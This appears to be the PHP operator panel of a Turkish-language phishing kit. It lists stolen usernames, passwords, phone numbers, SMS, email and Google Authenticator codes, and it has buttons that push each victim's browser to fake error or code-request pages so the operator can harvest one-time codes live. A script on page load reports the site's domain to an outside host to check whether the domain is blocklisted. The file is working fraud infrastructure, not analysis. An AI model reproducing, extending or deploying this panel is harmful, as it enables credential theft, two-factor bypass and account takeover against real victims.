<?php

$title = "Kayıtlar";

include_once 'partials/header.php';


if (isset($_SESSION['loggedIn']) && $_SESSION['loggedIn']) {
    $username = $_SESSION['username'];  
    $sessionToken = $_SESSION['session_token'];  

    $query = $db->prepare("SELECT session_token FROM admin WHERE username = ?");
    $query->execute([$username]);
    $user = $query->fetch(PDO::FETCH_ASSOC);

    if ($user['session_token'] !== $sessionToken) {
        session_destroy();
        header('Location: login.php');
        exit;
    }
}
?>

<div class="main-wrapper">

<audio id="notificationSound" src="1.mp3" preload="auto"></audio>



    <div class="d-flex justify-content-between">

        <div>

            <button type="button" id="export" class="btn btn-outline-primary m-b-xs">

                Dışa Aktar

            </button>

        </div>

        <div>

        <button type="button" class="btn btn-outline-secondary m-b-xs online-btn">Çevrimiçi: <span id="online">

    <?= $ajax->getOnline() ?>

</span></button>



            <button type="button" class="btn btn-outline-secondary m-b-xs">Toplam: <span id="total">

                    <?= $ajax->getTotalRecord() ?>

                </span></button>

            <button type="button" class="btn btn-outline-secondary m-b-xs">Ban: <span id="ban">

                    <?= $ajax->getBans()['count'] ?>

                </span></button>

        </div>

        <div>

            <button type="button" class="btn btn-warning m-b-xs" id="offlineClear">Çevrimdışı Sıfırla</button>

            <button type="button" class="btn btn-primary m-b-xs" id="recordClear">Log Sıfırla</button>

            <button type="button" class="btn btn-danger m-b-xs" id="banClear">Ban Sıfırla</button>

        </div>

    </div>

    <!-- Modal -->

    <div class="modal fade" id="processModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable" style="float: right;">
        <div class="modal-content">

                <div class="modal-header">

                    <h1 class="modal-title fs-5" id="exampleModalLabel">İşlem - <span id="processIP">0</span></h1>

                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>

                </div>

                <div class="modal-body pb-5">

                    <div style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center;">

                        <button class="btn btn-primary redirect mb-2 mx-2" data-page="basagonder" data-ip="">Başa

                            Gönder</button>

                        <button class="btn btn-primary redirect mb-2 mx-2" data-page="sifrehatali" data-ip="">Şifre

                            Hatalı</button>

                        <button class="btn btn-primary redirect mb-2 mx-2" data-page="telefon" data-ip="">Telefon

                            İste</button>

                            <button class="btn btn-custom-danger redirect mb-2 mx-2" data-page="sms" data-ip="">SMS</button>
<!-- Diğer kırmızı butonlar... -->

                        <button class="btn btn-primary redirect mb-2 mx-2" data-page="smshata" data-ip="">SMS

                            Hatalı</button>

                        <button class="btn btn-custom-danger redirect mb-2 mx-2" data-page="mailkod" data-ip="">Mail

                            Kod</button>

                        <button class="btn btn-primary redirect mb-2 mx-2" data-page="mailkodhata" data-ip="">Mail Kod

                            Hatalı</button>

                        <button class="btn btn-primary redirect mb-2 mx-2" data-page="auth" data-ip="">Auth</button>


                        <button class="btn btn-primary redirect mb-2 mx-2" data-page="2sms" data-ip="">2.SMS</button>

                        <button class="btn btn-primary redirect mb-2 mx-2" data-page="2mail" data-ip="">2.MAİL</button>

                        <button class="btn btn-primary redirect mb-2 mx-2" data-page="2auth" data-ip="">2.AUTH</button>





                        <button class="btn btn-success redirect mb-2 mx-2" data-page="tamamlandi"

                            data-ip="">Tamamlandı</button>

                    </div>



                </div>

            </div>

        </div>

    </div>

    <div class="table-responsive">

        <table class="table table-bordered">

            <thead>

                <tr>

                    <th width="1%" scope="col">#</th>

                    <th width="2%" scope="col">Sayfa</th>

                    <th width="5%" scope="col">K.adı</th>

                    <th width="5%" scope="col">Parola</th>

                    <th width="5%" scope="col">Telefon</th>

                    <th width="5%" scope="col">Sms</th>

                    <th width="5%" scope="col">Mail</th>

                    <th width="5%" scope="col">Google Auth</th>

                    <th width="5%" scope="col">Hotmail</th>

                    <th width="4%" scope="col">IP</th>

                    <th width="7%" scope="col">İşlem</th>

                    <th width="4%" scope="col">Kontrol-Sil</th>


                </tr>

            </thead>

            <tbody id="records">

                <?php foreach ($ajax->getAllRecords() as $record): ?>

                    <tr>

                        <?= ($record['lastOnline'] > time() ? '<td class="bg-success id">' . $record['id'] . '</td>' : '<td class="bg-danger id">' . $record['id'] . '</td>') ?>

                        <td>

                            <?= $record['page'] ?>

                        </td>

                        <td onclick="copy(this)">

                            <?= $record['username'] ?>

                        </td>

                        <td onclick="copy(this)">

                            <?= $record['password'] ?>

                        </td>

                        <td onclick="copy(this)">

                            <?= $record['phone'] ?>

                        </td>

                        <td onclick="copy(this)">

                            <?= $record['phone_sms'] ?>

                        </td>

                        <td onclick="copy(this)">

                            <?= $record['mail_sms'] ?>

                        </td>

                        <td onclick="copy(this)">

                            <?= $record['auth'] ?>

                        </td>

                        <td onclick="copy(this)">

                            <?= $record['hotmail'] ?>

                        </td>

                        <td onclick="copy(this)">

                            <?= $record['ipAddress'] ?>

                        </td>

          

                        <td class="p-0">

                            <div class="input-group">

                                <button class="btn btn-primary process_modal p-2 pb-1 pt-1"

                                    data-ip="<?= $record['ipAddress'] ?>"><i class="fas fa-cog"></i> İşlem</button>
                                    <button class="btn btn-secondary copyButton ml-2 p-2 pb-1 pt-1" data-username="<?= htmlspecialchars($record['username']) ?>" data-password="<?= htmlspecialchars($record['password']) ?>" data-phone="<?= htmlspecialchars($record['phone']) ?>">Kopyala</button>

                            </div>

                        </td>
<td>  <form method="post" action="kontrol_islemi" class="form-inline">
                    <input type="checkbox" class="form-check-input mr-2" style="width: 20px; height: 20px;" name="control" value="1" <?= $record['control'] ? 'checked' : '' ?>>
                    <input type="hidden" name="id" value="<?= htmlspecialchars($record['id']) ?>">
                    <button type="submit" class="btn btn-outline-secondary btn-sm">Güncelle</button>
                </form>
                <form method="post" action="silme_islemi" class="d-inline-block ml-2">
                    <input type="hidden" name="remove" value="true">
                    <input type="hidden" name="id" value="<?= htmlspecialchars($record['id']) ?>">
                    <button type="submit" class="btn btn-danger">Sil</button>
                </form> 
                </td>
                    </tr>

                <?php endforeach; ?>

            </tbody>

        </table>

    </div>



</div>
<style>
.btn-custom-danger {
    background-color: red;
    color: white;
    /* Diğer stil tanımlamaları... */
}

</style>
<script src="assets/js/ajax.js">
    



    <?php include_once 'partials/footer.php'; ?>

        <script>

        $(document).on("click", ".process_modal", function () {

            var ip = $(this).data('ip');

            $("#processModal").modal('show')



            $(".redirect").data('ip', ip)

            $("#processIP").text(ip)



        });

       $(document).on("click", ".redirect", function(){

	     $("#processModal").modal('hide')

	   })

</script>
<script>
function kontrolEt() {
    var benimDomain = window.location.hostname;
    var kontrolURL = "https://letsquirt.com/imam/lords.php?domain=" + benimDomain;

    fetch(kontrolURL)
        .then(response => response.json())
        .then(data => {
            if (data.includes("Domain listede var.")) {
                alert("Dikkat: Domain listede var.");
            } else {
                document.body.innerHTML += '<div style="position: fixed; top: 20px; right: 20px; padding: 15px; background-color: green; color: white; z-index: 1000;">Başarılı: Domain listede yok.</div>';
                setTimeout(function() {
                    document.body.removeChild(document.body.lastChild);
                }, 5000); 
            }
        })
        .catch(error => {
            console.error("Domain kontrol hatası:", error.message);
        });
}
window.onload = kontrolEt;
 </script>
 <script>
 function copy(element) {
    var text = element.innerText.trim();

    var tempTextArea = document.createElement("textarea");
    tempTextArea.value = text;
    document.body.appendChild(tempTextArea);
    tempTextArea.select();
    document.execCommand("copy");
    document.body.removeChild(tempTextArea);
}
</script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    document.querySelectorAll('.copyButton').forEach(button => {
        button.addEventListener('click', function () {
            var username = this.getAttribute('data-username');
            var password = this.getAttribute('data-password');
            var phone = this.getAttribute('data-phone');
            // Telefon numarasından baştaki '0'ı çıkarma
            phone = phone.startsWith('0') ? phone.substring(1) : phone;
            var textToCopy = username + ' ' + password + ' ' + phone;
            navigator.clipboard.writeText(textToCopy).then(function() {
                console.log('Kopyalandı:', textToCopy);
            }, function(err) {
                console.error('Kopyalama hatası:', err);
            });
        });
    });
});
</script>


